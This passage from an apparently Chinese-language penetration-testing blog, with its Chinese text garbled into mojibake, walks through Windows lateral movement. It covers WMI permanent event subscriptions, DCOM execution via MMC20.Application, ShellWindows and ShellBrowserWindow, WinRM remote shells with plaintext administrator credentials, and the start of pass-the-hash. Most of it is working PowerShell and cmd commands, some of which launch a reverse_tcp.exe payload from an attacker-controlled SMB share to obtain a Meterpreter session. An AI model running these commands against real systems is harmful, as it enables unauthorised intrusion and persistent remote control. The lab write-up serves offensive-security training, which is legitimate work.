@GlobalArgs</span><br></code></pre></td></tr></table></figure></li><li><p>åœ¨è¿œç¨‹ä¸»æœºä¸Šéƒ¨ç½²ä¸€ä¸ªåä¸ºâ€TestConsumerâ€çš„äº‹ä»¶æ¶ˆè´¹è€…</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">CommandLineEventConsumerArgs = @&#123;</span><br>    Name = &quot;TestConsumer&quot;<br>    CommandLineTemplate = &quot;C:\Windows\System32\cmd.exe /c calc.exe&quot;<br>&#125;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">EventConsumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments <span class="hljs-variable">$CommandLineEventConsumerArgs</span> @GlobalArgs</span><br></code></pre></td></tr></table></figure></li><li><p>å°†åˆ›å»ºçš„äº‹ä»¶è¿‡æ»¤å™¨å’Œæ—¶é—´æ¶ˆè´¹è€…ç»‘å®šåœ¨ä¸€èµ·</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$</span><span class="language-bash">FilterConsumerBindingArgs = @&#123;</span><br>    Filter = $EventFilter<br>    Consumer = $EventConsumer<br>&#125;<br><span class="hljs-meta prompt_">$</span><span class="language-bash">FilterConsumerBinding = Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments <span class="hljs-variable">$FilterConsumerBindingArgs</span> @GlobalArgs</span><br></code></pre></td></tr></table></figure></li></ol><p>åˆ°æ­¤ï¼Œå·²ç»æˆåŠŸåœ¨è¿œç¨‹ä¸»æœº(10.10.10.19)ä¸Šéƒ¨ç½²äº†ä¸€ä¸ªäº‹ä»¶è®¢é˜…ï¼Œå½“è¿œç¨‹ç³»ç»Ÿè½®è¯¢åˆ° svchost.exeè¿›ç¨‹äº§ç”Ÿæ—¶ï¼Œå°†é€šè¿‡äº‹ä»¶æ¶ˆè´¹è€…æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ¥å¯åŠ¨calc.exeè¿›ç¨‹ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151448986.png" alt="image-20240415094422693"></p><p><strong>Sharp-WMIEvent</strong></p><p>ä¸Šé¢çš„åˆ©ç”¨è¿‡ç¨‹å¯ä»¥æ•´åˆä¸ºä¸€ä¸ªpowershellè„šæœ¬ã€‚ä¸è¿‡ç›¸å…³è„šæœ¬é¡¹ç›®ç½‘ä¸Šå¥½åƒæ²¡äº†ã€‚</p><ol><li><p>åœ¨å¯æ§çš„æœåŠ¡å™¨ä¸Šæ­å»ºSMBå…±äº«æœåŠ¡å™¨ï¼Œå¹¶å°†ç”Ÿæˆçš„æ”»å‡»è½½è·æ”¾å…¥å…±äº«ç›®å½•</p></li><li><p>åœ¨è·³æ¿æœºä¸Šæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œè¿è¡Œè¯¥è„šæœ¬ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Sharp-WMIEvent -Trigger Interval -IntervalPeriod 60 -ComputerName 10.10.10.19 -Domain hack-my.com -Username Administrator -Password Admin@123 -Command &quot;cmd.exe /c \\10.10.10.147\evilsmb\reverse_tcp.exe&quot;<br></code></pre></td></tr></table></figure></li></ol><p>ç„¶åå°±å°†åœ¨è¿œç¨‹ä¸»æœºä¸Šéƒ¨ç½²ä¸€ä¸ªéšæœºå‘½åçš„æ°¸ä¹…äº‹ä»¶è®¢é˜…ï¼Œå¹¶éš”60ç§’ä¼šæ‰§è¡Œä¸€æ¬¡SMBå…±äº«ä¸­çš„æ”»å‡»è½½è·ï¼Œä¸Šçº¿è¿œç¨‹ä¸»æœº</p><p><img src="http://cdn.clown2024.cn/202407151448987.png" alt="image-20240415165851113"></p><p><img src="http://cdn.clown2024.cn/202407151448988.png" alt="image-20240415165904903"></p><h1 id="dcomçš„åˆ©ç”¨"><a href="#DCOMçš„åˆ©ç”¨" class="headerlink" title="DCOMçš„åˆ©ç”¨"></a>DCOMçš„åˆ©ç”¨</h1><h2 id="comå’Œdcom"><a href="#COMå’ŒDCOM" class="headerlink" title="COMå’ŒDCOM"></a>COMå’ŒDCOM</h2><p><strong>COM</strong></p><p>COM(Component Object Modelï¼Œç»„ä»¶å¯¹è±¡æ¨¡å‹)æ˜¯å¾®è½¯çš„ä¸€å¥—è½¯ä»¶ç»„ä»¶çš„äºŒè¿›åˆ¶æ¥å£æ ‡å‡†ï¼Œä½¿å¾—è·¨ç¼–ç¨‹è¯­è¨€çš„è¿›ç¨‹é—´é€šä¿¡ã€åŠ¨æ€å¯¹è±¡åˆ›å»ºæˆä¸ºå¯èƒ½ã€‚COMæ˜¯å¤šé¡¹å¾®è½¯æŠ€æœ¯ä¸æ¡†æ¶çš„åŸºç¡€ï¼ŒåŒ…æ‹¬ OLEã€OLEè‡ªåŠ¨åŒ–ã€ActiveXã€COM+ã€DCOMã€Windows Shellã€DirectXã€Windows Runtimeã€‚</p><p>COM ç”±ä¸€ç»„æ„é€ è§„èŒƒå’Œç»„ä»¶å¯¹è±¡åº“ç»„æˆã€‚COMç»„ä»¶å¯¹è±¡é€šè¿‡æ¥å£æ¥æè¿°è‡ªèº«ï¼Œç»„ä»¶æä¾›çš„æ‰€æœ‰æœåŠ¡éƒ½é€šè¿‡å…¶æ¥å£å…¬å¼€ã€‚æ¥å£è¢«å®šä¹‰ä¸ºâ€œåœ¨å¯¹è±¡ä¸Šå®ç°çš„ä¸€ç»„è¯­ä¹‰ä¸Šç›¸å…³çš„åŠŸèƒ½â€ï¼Œå®è´¨æ˜¯ä¸€ç»„å‡½æ•°æŒ‡é’ˆè¡¨ã€‚æ¯ä¸ªæŒ‡é’ˆå¿…é¡»åˆå§‹åŒ–æŒ‡å‘æŸä¸ªå…·ä½“çš„å‡½æ•°ä½“ï¼Œä¸€ä¸ªç»„ä»¶å¯¹è±¡å®ç°çš„æ¥å£æ•°é‡æ²¡æœ‰é™åˆ¶ã€‚COMæŒ‡å®šäº†ä¸€ä¸ªå¯¹è±¡æ¨¡å‹å’Œç¼–ç¨‹è¦æ±‚ï¼Œä½¿COMå¯¹è±¡èƒ½å¤Ÿä¸å…¶ä»–å¯¹è±¡äº¤äº’ã€‚è¿™äº›å¯¹è±¡å¯ä»¥åœ¨å•ä¸ªè¿›ç¨‹ä¸­ï¼Œä¹Ÿå¯ä»¥åœ¨å…¶ä»–è¿›ç¨‹ä¸­ï¼Œç”šè‡³å¯ä»¥åœ¨è¿œç¨‹è®¡ç®—æœºä¸Šã€‚</p><p>åœ¨ Windowsä¸­ï¼Œæ¯ä¸ªCOM å¯¹è±¡éƒ½ç”±å”¯ä¸€çš„128 ä½çš„äºŒè¿›åˆ¶æ ‡è¯†ç¬¦æ ‡è¯†ï¼Œå³ GUIDå½“ GUIDç”¨äºæ ‡è¯† COM å¯¹è±¡æ—¶ï¼Œè¢«ç§°ä¸ºCLSID(ç±»æ ‡è¯†ç¬¦)ï¼›å½“å®ƒç”¨äºæ ‡è¯†æ¥å£æ—¶ï¼Œè¢«ç§°ä¸ºIID(æ¥å£æ ‡è¯†ç¬¦)ã€‚ä¸€äº›CLSIDè¿˜å…·æœ‰ProgIDï¼Œæ–¹ä¾¿äººä»¬è®°å¿†ã€‚</p><p><strong>DCOM</strong></p><p>DCOM(Distributed Component Object Modelï¼Œåˆ†å¸ƒå¼ç»„ä»¶å¯¹è±¡æ¨¡å‹)æ˜¯å¾®è½¯åŸºäºç»„ä»¶å¯¹è±¡æ¨¡å‹(COM)çš„ä¸€ç³»åˆ—æ¦‚å¿µå’Œç¨‹åºæ¥å£ï¼Œæ”¯æŒä¸åŒæœºå™¨ä¸Šçš„ç»„ä»¶é—´çš„é€šä¿¡ã€‚åˆ©ç”¨DCOMï¼Œå®¢æˆ·ç«¯ç¨‹åºå¯¹è±¡èƒ½å¤Ÿè¯·æ±‚æ¥è‡ªç½‘ç»œä¸­å¦ä¸€å°è®¡ç®—æœºä¸Šçš„æœåŠ¡å™¨ç¨‹åºå¯¹è±¡ã€‚</p><p>DCOMæ˜¯COMçš„æ‰©å±•,å…è®¸åº”ç”¨ç¨‹åºå®ä¾‹åŒ–å’Œè®¿é—®è¿œç¨‹è®¡ç®—æœºä¸Šçš„COMå¯¹è±¡çš„å±æ€§å’Œæ–¹æ³•ã€‚DCOMä½¿ç”¨è¿œç¨‹è¿‡ç¨‹è°ƒç”¨(RPC)æŠ€æœ¯å°†ç»„ä»¶å¯¹è±¡æ¨¡å‹(COM)çš„åŠŸèƒ½æ‰©å±•åˆ°æœ¬åœ°è®¡ç®—æœºä¹‹å¤–,å› æ­¤,åœ¨è¿œç¨‹ç³»ç»Ÿä¸Šæ‰˜ç®¡COMæœåŠ¡å™¨ç«¯çš„è½¯ä»¶(é€šå¸¸åœ¨ DLL æˆ–EXEä¸­)å¯ä»¥é€šè¿‡RPCå‘å®¢æˆ·ç«¯å…¬å¼€å…¶æ–¹æ³•ã€‚</p><h2 id="é€šè¿‡dcomæ¨ªå‘ç§»åŠ¨"><a href="#é€šè¿‡DCOMæ¨ªå‘ç§»åŠ¨" class="headerlink" title="é€šè¿‡DCOMæ¨ªå‘ç§»åŠ¨"></a>é€šè¿‡DCOMæ¨ªå‘ç§»åŠ¨</h2><p>éƒ¨åˆ†DCOMç»„ä»¶ä¸­å…¬å¼€çš„æ¥å£ä¸­å¯èƒ½åŒ…å«ä¸å®‰å…¨çš„æ–¹æ³•ã€‚</p><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤å¯ä»¥æŸ¥çœ‹æ‰€æœ‰DCOMç¨‹åºç»„ä»¶ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Get-CimInstance Win32_DCOMApplication<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448989.png" alt="image-20240415235944954"></p><p>æµ‹è¯•äººå‘˜å¯ä»¥æšä¸¾åŒ…å«ä¸å®‰å…¨æ–¹æ³•çš„DCOMå¯¹è±¡ï¼Œå¹¶äºè¿œç¨‹è®¡ç®—æœºçš„DCOMå¯¹è±¡è¿›è¡Œäº¤äº’ï¼Œä»è€Œå®ç°è¿œç¨‹æ‰§è¡Œã€‚ä¸è¿‡éœ€è¦æ»¡è¶³ä¸‹é¢çš„æ¡ä»¶ï¼šæ‹¥æœ‰ç®¡ç†å‘˜æƒé™çš„PowerShellï¼›è¿œç¨‹ä¸»æœºæœªå¼€å¯é˜²ç«å¢™ã€‚</p><p>ç›®å‰å¸¸ç”¨çš„ç»„ä»¶æœ‰ï¼šMMC20.Applicationã€ShellWindowsã€Excel.Applicationã€ShellBrowserWindowç­‰ã€‚</p><p><strong>MMC20.Application</strong></p><p>MMC20.Applicationå¯¹è±¡çš„Document.ActiveViewä¸‹å­˜åœ¨ä¸€ä¸ªExecuteShellCommandæ–¹æ³•ï¼Œå¯ä»¥ç”¨æ¥å¯åŠ¨å­è¿›ç¨‹å¹¶è¿è¡Œæ‰§è¡Œçš„ç¨‹åºæˆ–ç³»ç»Ÿå‘½ä»¤</p><p>ä¸‹é¢åˆ©ç”¨è¯¥ç»„ä»¶ä¸Šçº¿Meterpreter</p><ol><li><p>åœ¨ä¸€å°æœåŠ¡å™¨æ­å»ºSMBåŒ¿åå…±äº«æœåŠ¡ï¼Œå°†æ”»å‡»è½½è·æ”¾åœ¨å…±äº«ç›®å½•ä¸‹é¢</p></li><li><p>åœ¨ç®¡ç†å‘˜æƒé™çš„PowerShellæ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">é€šè¿‡ ProgID ä¸ DCOM è¿›è¡Œè¿œç¨‹äº¤äº’ï¼Œå¹¶åˆ›å»º MMC20.Application å¯¹è±¡çš„å®ä¾‹</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com = [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromProgID(<span class="hljs-string">&quot;MMC20.Application&quot;</span>,<span class="hljs-string">&quot;10.10.10.19&quot;</span>))</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">è°ƒç”¨ExecuteShellCommandæ–¹æ³•å¯åŠ¨è¿›ç¨‹ï¼Œä»¥è¿è¡Œæ”»å‡»è½½è·</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com.Document.ActiveView.ExecuteShellCommand(<span class="hljs-string">&#x27;cmd.exe&#x27;</span>,<span class="hljs-variable">$null</span>,<span class="hljs-string">&quot;/c \\192.168.2.143\evilsmb\reverse_tcp.exe&quot;</span>,<span class="hljs-string">&quot;Minimized&quot;</span>)</span><br></code></pre></td></tr></table></figure></li></ol><p><img src="http://cdn.clown2024.cn/202407151448990.png" alt="image-20240416002841235"></p><p>åœ¨è°ƒç”¨è¿‡ç¨‹ä¸­,MMC20.Applicationä¼šå¯åŠ¨mmc.exeè¿›ç¨‹,é€šè¿‡ExecuteShellCommandæ–¹æ³•åœ¨ mmc.exe ä¸­åˆ›å»ºå­è¿›ç¨‹ï¼Œé€‚ç”¨äº Windows7åŠä»¥ä¸Šç‰ˆæœ¬çš„ç³»ç»Ÿ,</p><p><strong>ShellWindows</strong></p><p>ShellWindows ç»„ä»¶æä¾›äº† Document.Application.ShellExecute æ–¹æ³•ï¼Œå¯ä»¥å¯åŠ¨å­è¿›ç¨‹æ¥è¿è¡ŒæŒ‡å®šçš„ç¨‹åºæˆ–ç³»ç»Ÿå‘½ä»¤ï¼Œé€‚ç”¨äºWindows7åŠä»¥ä¸Šç‰ˆæœ¬çš„ç³»ç»Ÿã€‚</p><p><img src="http://cdn.clown2024.cn/202407151448991.png" alt="image-20240416003019343"></p><p>å› ä¸ºè¯¥å¯¹è±¡æ²¡æœ‰ProgIDï¼Œæ‰€ä»¥éœ€è¦CLSIDæ¥åˆ›å»ºå®ä¾‹ã€‚</p><p>å¯ä»¥ç”¨ä¸‹é¢å‘½ä»¤æ¥æŸ¥æ‰¾ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Get-CimInstance Win32_DCOMApplication | findstr ShellWindows<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥é€šè¿‡OleViewDotNetæ¥æŸ¥æ‰¾ï¼ŒOleViewDotNet æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„å·¥å…·ï¼Œéœ€è¦å®‰è£…å¹¶åœ¨ Windows æ“ä½œç³»ç»Ÿä¸Šè¿è¡Œã€‚</p><p><img src="http://cdn.clown2024.cn/202407151448992.png" alt="image-20240416003638763"></p><p>è·Ÿä¸Šé¢çš„åˆ©ç”¨æ–¹æ³•ç±»ä¼¼ï¼Œåœ¨ç®¡ç†å‘˜æƒé™PowerShellä¸‹æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">é€šè¿‡CLSIDä¸DCOMè¿›è¡Œè¿œç¨‹äº¤äº’ï¼Œå¹¶åˆ›å»ºShellWindowså¯¹è±¡å®ä¾‹</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com = [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;9BA05972-F6A8-11CF-A442-00A0C90A8F39&quot;</span>,<span class="hljs-string">&quot;10.10.10.19&quot;</span>))</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">è°ƒç”¨ShellExecuteæ–¹æ³•å¯åŠ¨å­è¿›ç¨‹</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com.item().Document.Application.ShellExecute(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;C:\Windows\System32&quot;</span>,<span class="hljs-variable">$null</span>,0)</span><br></code></pre></td></tr></table></figure><p>æ³¨æ„ï¼ŒShellWindowså¹¶ä¸ä¼šåˆ›å»ºæ–°è¿›ç¨‹ï¼Œè€Œæ˜¯åœ¨å·²æœ‰ explorer.exeè¿›ç¨‹ä¸­åˆ›å»ºå¹¶æ‰§è¡Œå­è¿›ç¨‹ã€‚</p><p><img src="http://cdn.clown2024.cn/202407151448993.png" alt="image-20240416004155840"></p><p><strong>ShellBrowserWindow</strong></p><p>ShellBrowserWindowä¸­ä¹Ÿå­˜åœ¨ä¸€ä¸ªDocument.Application.ShellExecuteæ–¹æ³•ï¼Œä¸ShellWindows ä¸€æ ·ï¼Œä½†ä¸ä¼šåˆ›å»ºæ–°è¿›ç¨‹ï¼Œè€Œæ˜¯é€šè¿‡å·²æœ‰çš„ explorer.exe æ¥æ‰˜ç®¡å­è¿›ç¨‹ã€‚è¯¥æ–¹æ³•åªé€‚ç”¨äº Windows 10å’Œ Windows Server 2012ç­‰ç‰ˆæœ¬çš„ç³»ç»Ÿ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">é€šè¿‡CLSIDä¸DCOMè¿›è¡Œè¿œç¨‹äº¤äº’ï¼Œå¹¶åˆ›å»ºShellBrowserWindowå¯¹è±¡å®ä¾‹</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com = [activator]::CreateInstance([<span class="hljs-built_in">type</span>]::GetTypeFromCLSID(<span class="hljs-string">&quot;c08afd90-f2a1-11d1-8455-00a0c91f3880&quot;</span>,<span class="hljs-string">&quot;10.10.10.19&quot;</span>))</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">è°ƒç”¨ShellExecuteæ–¹æ³•å¯åŠ¨å­è¿›ç¨‹</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">com.item().Document.Application.ShellExecute(<span class="hljs-string">&quot;cmd.exe&quot;</span>,<span class="hljs-string">&quot;/c calc.exe&quot;</span>,<span class="hljs-string">&quot;C:\Windows\System32&quot;</span>,<span class="hljs-variable">$null</span>,0)</span><br></code></pre></td></tr></table></figure><h1 id="winrmçš„åˆ©ç”¨"><a href="#WinRMçš„åˆ©ç”¨" class="headerlink" title="WinRMçš„åˆ©ç”¨"></a>WinRMçš„åˆ©ç”¨</h1><p>WinRM æ˜¯é€šè¿‡æ‰§è¡Œ WS-Management åè®®(ç”¨äºè¿œç¨‹è½¯ä»¶å’Œç¡¬ä»¶ç®¡ç†çš„ Web æœåŠ¡åè®®)æ¥å®ç°è¿œç¨‹ç®¡ç†çš„ï¼Œå…è®¸å¤„äºä¸€ä¸ªå…±åŒç½‘ç»œå†…çš„ Windows è®¡ç®—æœºå½¼æ­¤ä¹‹é—´äº’ç›¸è®¿é—®å’Œäº¤æ¢ä¿¡æ¯ï¼Œå¯¹åº”çš„ç«¯å£æ˜¯ 5985ã€‚åœ¨ä¸€å°è®¡ç®—æœºå¯ç”¨ WinRM æœåŠ¡åï¼Œé˜²ç«å¢™ä¼šè‡ªåŠ¨æ”¾è¡Œå…¶ç›¸å…³é€šä¿¡ç«¯å£ï¼Œå¦ä¸€å°è®¡ç®—æœºä¾¿èƒ½é€šè¿‡ WinRM å¯¹å…¶è¿›è¡Œè¿œç¨‹ç®¡ç†äº†ã€‚</p><p>æ³¨æ„ï¼Œåªæœ‰åœ¨Windows Server 2008ä»¥ä¸Šç‰ˆæœ¬çš„æœåŠ¡å™¨ä¸­WinRM æœåŠ¡æ‰ä¼šè‡ªåŠ¨å±…åŠ¨ã€‚æµ‹è¯•äººå‘˜é€šè¿‡ WinRM æœåŠ¡è¿›è¡Œæ¨ªå‘ç§»åŠ¨æ—¶ï¼Œéœ€è¦æ‹¥æœ‰è¿œç¨‹ä¸»æœºçš„ç®¡ç†å‘˜å‡­æ®ä¿¡æ¯ã€‚</p><h2 id="é€šè¿‡winrmæ‰§è¡Œè¿œç¨‹å‘½ä»¤"><a href="#é€šè¿‡WinRMæ‰§è¡Œè¿œç¨‹å‘½ä»¤" class="headerlink" title="é€šè¿‡WinRMæ‰§è¡Œè¿œç¨‹å‘½ä»¤"></a>é€šè¿‡WinRMæ‰§è¡Œè¿œç¨‹å‘½ä»¤</h2><p><strong>Winrs</strong></p><p>Winrsæ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯ç¨‹åºï¼Œé€šè¿‡ç”¨æˆ·å‡­æ®åœ¨è¿è¡ŒWinRMçš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼ŒåŒæ–¹éƒ½éœ€è¦å®‰è£…WinRMã€‚</p><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤åœ¨è¿œç¨‹ä¸»æœºæ‰§è¡Œä¸Šæ‰§è¡Œå‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">winrs -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123 &quot;whoami&quot;<br></code></pre></td></tr></table></figure><p>è¿˜å¯ä»¥è·å¾—äº¤äº’å¼å‘½ä»¤è¡Œ</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">winrs -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123 &quot;cmd&quot;<br></code></pre></td></tr></table></figure><p><strong>Winrm.cmd</strong></p><p>Winrm.cmd å…è®¸ WMIå¯¹è±¡é€šè¿‡ WinRM ä¼ è¾“è¿›è¡Œè¿œç¨‹äº¤äº’ï¼Œåœ¨æœ¬åœ°æˆ–è¿œç¨‹è®¡ç®—æœºä¸Šæšä¸¾ WMI å¯¹è±¡å®ä¾‹æˆ–è°ƒç”¨ WMI ç±»æ–¹æ³•ã€‚ä¾‹å¦‚ï¼Œé€šè¿‡è°ƒç”¨ Win32_Process ç±»ä¸­çš„ Createæ–¹æ³•æ¥åˆ›å»ºè¿œç¨‹è¿›ç¨‹ã€‚</p><p>å®æˆ˜ä¸­å¯ä»¥è¿œç¨‹æ‰§è¡Œä¸€ä¸ªæ”»å‡»è½½è·ï¼Œè¿™é‡Œå°è¯•å¯åŠ¨ä¸€ä¸ªnotepad.exeè¿›ç¨‹ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">winrm invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck @&#123;commandline=&quot;notepad.exe&quot;&#125; -r:http://10.10.10.19:5985 -u:Administrator -p:Admin@123<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹è¿œç¨‹ä¸»æœºçš„è¿›ç¨‹ï¼Œå¯ä»¥çœ‹åˆ°æ­£åœ¨è¿è¡Œ</p><p><img src="http://cdn.clown2024.cn/202407151448994.png" alt="image-20240416005418907"></p><h2 id="é€šè¿‡winrmè·å–äº¤äº’å¼ä¼šè¯"><a href="#é€šè¿‡WinRmè·å–äº¤äº’å¼ä¼šè¯" class="headerlink" title="é€šè¿‡WinRmè·å–äº¤äº’å¼ä¼šè¯"></a>é€šè¿‡WinRmè·å–äº¤äº’å¼ä¼šè¯</h2><p><strong>PowerShellä¸‹çš„åˆ©ç”¨</strong></p><p>PowerShell çš„è¿œç¨‹ä¼ è¾“åè®®åŸºäºWinRMè§„èŒƒï¼ŒåŒæ—¶æä¾›äº†å¼ºå¤§çš„è¿œç¨‹ç®¡ç†åŠŸèƒ½ã€‚</p><p>Enter-PSSessionçš„PowerShellCmdletå¯ä»¥å¯åŠ¨ä¸è¿œç¨‹ä¸»æœºçš„ä¼šè¯ã€‚åœ¨ä¼šè¯äº¤äº’æœŸé—´ç”¨æˆ·è¾“å…¥çš„å‘½ä»¤åœ¨è¿œç¨‹è®¡ç®—æœºä¸Šè¿è¡Œï¼Œå°±åƒç›´æ¥åœ¨è¿œç¨‹è®¡ç®—æœºä¸Šè¾“å…¥ä¸€æ ·ã€‚</p><ol><li><p>è·³æ¿æœºä¸Šæ‰§è¡Œä»¥ä¸‹å‘½ä»¤å¯åŠ¨ä¸€ä¸ªä¸è¿œç¨‹ä¸»æœºçš„äº¤äº’å¼ä¼šè¯ï¼Œå…¶åç§°ä¸ºWinRM1</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">æŒ‡å®šè¿œç¨‹ç³»ç»Ÿç”¨æˆ·å</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">User = <span class="hljs-string">&quot;HACK-MY\Administrator&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">æŒ‡å®šç”¨æˆ·çš„å¯†ç </span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Password = ConvertTo-SecureString -String <span class="hljs-string">&quot;Admin@123&quot;</span> -AsPlainText -Force</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">å°†ç”¨æˆ·åå’Œå¯†ç æ•´åˆï¼Œä»¥ä¾¿å¯¼å…¥Credential</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Cred = New-0bject -TypeName System.Management.Automation.PSCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">æ ¹æ®æä¾›çš„å‡­æ®åˆ›å»ºä¼šè¯</span><br>New-PSSession -Name WinRM1 -ComputerName 10.10.10.19 -Credential $cred -Port 5985<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448995.png" alt="image-20240416092847951"></p></li><li><p>æ‰§è¡Œ<strong>Get-PSSession</strong>æŸ¥çœ‹å½“å‰å·²åˆ›å»ºçš„PSSessionä¼šè¯</p><p><img src="http://cdn.clown2024.cn/202407151448996.png" alt="image-20240416093011945"></p></li><li><p>æ‰§è¡Œä¸‹é¢å‘½ä»¤ï¼Œé€‰ä¸­ä»»æ„ä¸€ä¸ªä¼šè¯ï¼Œè¿›å…¥äº¤äº’æ¨¡å¼</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">Enter-PSSession -Name WinRM1<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448997.png" alt="image-20240416093130574"></p></li><li><p>ä¹Ÿå¯ä»¥é€šè¿‡Invoke-Commandåœ¨æŒ‡å®šçš„ä¼šè¯ä¸­æ‰§è¡Œä¸‹é¢å‘½ä»¤</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">æŒ‡å®šè¿œç¨‹ç³»ç»Ÿç”¨æˆ·å</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">User =<span class="hljs-string">&quot;HACK-MY\Administrator&quot;</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">æŒ‡å®šç”¨æˆ·çš„å¯†ç </span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Password =ConvertTo-SecureString -String <span class="hljs-string">&quot;Admin@123&quot;</span> -AsPlainText -Force</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">å°†ç”¨æˆ·åå’Œå¯†ç æ•´åˆï¼Œä»¥ä¾¿å¯¼å…¥Credential</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Cred = New-0bject -TypeName System.Management.Automation.PsCredential -ArgumentList <span class="hljs-variable">$User</span>,<span class="hljs-variable">$Password</span></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">æ ¹æ®æä¾›çš„å‡­æ®åˆ›å»ºä¼šè¯</span><br><span class="hljs-meta prompt_">$</span><span class="language-bash">Sess=New-PSSession -Name WinRMl -ComputerName 10,10,10.19 -Credential <span class="hljs-variable">$Cred</span> -Port 5985</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">åœ¨åˆ›å»ºçš„ä¼šè¯ä¸­æ‰§è¡Œå‘½ä»¤</span><br>Invoke-Command -Session $Sess -ScriptBlock&#123;dir c:\&#125;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151448998.png" alt="image-20240416093424298"></p></li></ol><p><strong>Evil-Winrm</strong></p><p>Evil-Winrm æ˜¯åŸºäº WinRM Shell çš„æ¸—é€æ¡†æ¶ï¼Œå¯é€šè¿‡æä¾›çš„ç”¨æˆ·åå¯†ç æˆ–ç”¨æˆ·å“ˆå¸Œå€¼åœ¨å¯ç”¨äº† WinRM æœåŠ¡çš„ç›®æ ‡ä¸»æœºä¸Šå®Œæˆç®€å•çš„æ”»å‡»ä»»åŠ¡ã€‚</p><h1 id="å“ˆå¸Œä¼ é€’æ”»å‡»"><a href="#å“ˆå¸Œä¼ é€’æ”»å‡»" class="headerlink" title="å“ˆå¸Œä¼ é€’æ”»å‡»"></a>å“ˆå¸Œä¼ é€’æ”»å‡»</h1><p>å“ˆå¸Œä¼ é€’(Pass The Hashï¼ŒPTH)æ˜¯ä¸€ç§é’ˆå¯¹NTLMåè®®çš„æ”»å‡»æŠ€æœ¯ã€‚åœ¨NTLM èº«ä»½è®¤è¯çš„ç¬¬ä¸‰æ­¥ä¸­ç”ŸæˆResponse æ—¶ï¼Œå®¢æˆ·ç«¯ç›´æ¥ä½¿ç”¨ç”¨æˆ·çš„NTLM å“ˆå¸Œå€¼è¿›è¡Œè®¡ç®—ï¼Œç”¨æˆ·çš„æ˜æ–‡å¯†ç å¹¶ä¸å‚ä¸æ•´ä¸ªè®¤è¯è¿‡ç¨‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œåœ¨Windows ç³»ç»Ÿä¸­åªä½¿ç”¨ç”¨æˆ·å“ˆå¸Œå€¼å¯¹è®¿é—®èµ„æºçš„ç”¨æˆ·è¿›è¡Œèº«ä»½è®¤è¯ã€‚</p><p>å› 